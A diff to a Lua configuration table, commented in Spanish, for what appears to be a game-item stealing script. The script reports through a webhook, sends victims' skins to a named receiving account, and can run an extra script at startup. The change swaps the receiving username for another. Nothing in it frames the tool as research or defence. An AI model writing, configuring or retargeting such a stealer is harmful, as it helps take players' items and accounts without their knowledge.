@@ -1,7 +1,7 @@
 local CONFIG = {
     ANONYMOUS     = false, -- oculta los nombres en el webhook
 
-    TARGET_NAME   = "erminus_29", -- username de la cuenta que recibe las skins
+    TARGET_NAME   = "dynamo2987", -- username de la cuenta que recibe las skins
    
     -- Script extra que se ejecuta al iniciar, puede ser un script de Yisus o cualquier otro script.
     -- Dejar vacio para desactivar
